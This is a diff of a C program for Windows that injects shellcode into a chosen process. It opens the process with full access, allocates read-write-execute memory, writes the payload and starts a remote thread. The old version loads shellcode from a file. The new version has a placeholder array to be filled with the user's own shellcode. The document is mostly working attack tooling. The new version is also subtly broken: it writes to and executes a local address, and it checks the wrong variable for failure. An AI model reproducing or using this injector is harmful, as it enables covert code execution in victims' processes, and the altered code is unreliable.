@@ -1,9 +1,11 @@
 #include <windows.h>
 #include <stdio.h>
 
-DWORD targetProcessID, exitCode = NULL;
-HANDLE targetProcess = NULL, remoteThread = NULL;
-LPVOID remoteShellcode = NULL;
+DWORD PID, TID = NULL;
+HANDLE hProcess = NULL, hThread = NULL;
+LPVOID rBuf = NULL;
+
+unsigned char kxrPuke[] = {}; /* Replace this with your shellcode! */
 
 int main(int argc, char* argv[]) {
     if (argc < 3) {
@@ -11,61 +13,41 @@ int main(int argc, char* argv[]) {
         return EXIT_FAILURE;
     }
 
-    targetProcessID = atoi(argv[1]);
-    printf("[kxr] | Hooking Process <%ld>\n", targetProcessID);
+    PID = atoi(argv[1]);
+    printf("[kxr] | Hooking Process <%ld>\n", PID);
 
     /* Create Process */
-    targetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessID);
-    printf("[kxr] | Hooked Process!\n\\---0x%p\n", targetProcess);
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
+    printf("[kxr] | Hooked Process!\n\\---0x%p\n", hProcess);
 
     /* Is targetProcess NULL? */
-    if (targetProcess == NULL) {
-        printf("[kxr] | Couldn't Hook Process <%ld>. With error: <%ld>\n", targetProcessID, GetLastError());
+    if (PID == NULL) {
+        printf("[kxr] | Couldn't Hook Process <%ld>. With error: <%ld>\n", PID, GetLastError());
         return EXIT_FAILURE;
     }
-
-    /* Read shellcode from file */
-    FILE* shellcodeFile = fopen(argv[2], "rb");
-    if (shellcodeFile == NULL) {
-        printf("[kxr] | Unable to open Shellcode file <%s>\n", argv[2]);
-        CloseHandle(targetProcess);
-        return EXIT_FAILURE;
-    }
-
-    fseek(shellcodeFile, 0, SEEK_END);
-    size_t fileSize = ftell(shellcodeFile);
-    fseek(shellcodeFile, 0, SEEK_SET);
-
-    unsigned char* shellcode = (unsigned char*)malloc(fileSize);
-    fread(shellcode, 1, fileSize, shellcodeFile);
-    fclose(shellcodeFile);
-
-    printf("[kxr] | Read %zu-bytes Shellcode from file <%s>\n", fileSize, argv[2]);
 
     /* Allocate shellcode to Process */
-    remoteShellcode = VirtualAllocEx(targetProcess, NULL, fileSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
-    printf("[kxr] | Allocated %zu-bytes with RWX Perms | <ReadWriteExecute>\n", fileSize);
+    rBuf = VirtualAllocEx(hProcess, NULL, sizeof(kxrPuke), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+    printf("[kxr] | Allocated %zu-bytes with RWX Perms | <ReadWriteExecute>\n", sizeof(kxrPuke));
 
     /* Write the allocated memory to process */
-    WriteProcessMemory(targetProcess, remoteShellcode, shellcode, fileSize, NULL);
-    printf("[kxr] | Wrote %zu-bytes to Process <%ld>\n", fileSize, targetProcessID);
+    WriteProcessMemory(hProcess, kxrPuke, kxrPuke, sizeof(kxrPuke), NULL);
+    printf("[kxr] | Wrote %zu-bytes to Process <%ld>\n", sizeof(kxrPuke), PID);
 
     /* Create thread to run shellcode */
-    remoteThread = CreateRemoteThreadEx(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteShellcode, NULL, 0, 0, &exitCode);
+    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)kxrPuke, NULL, 0, 0, &TID);
 
-    if (remoteThread == NULL) {
+    if (hThread == NULL) {
         printf("[kxr] | Failed to create thread. With error: %ld\n", GetLastError());
-        CloseHandle(targetProcess);
-        free(shellcode);
+        CloseHandle(hProcess);
         return EXIT_FAILURE;
     }
 
-    printf("[kxr] | Created Thread <%ld>\n\\---0x%p\n", exitCode, remoteThread);
-
+    printf("[kxr] | Created Thread <%ld>\n\\---0x%p\n", TID, hThread);
+    WaitForSingleObject(hThread, INFINITE);
     printf("[kxr] | GG'S. Closing all Thread's and Handle's\n");
-    CloseHandle(remoteThread);
-    CloseHandle(targetProcess);
-    free(shellcode);
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
 
     return EXIT_SUCCESS;
 }
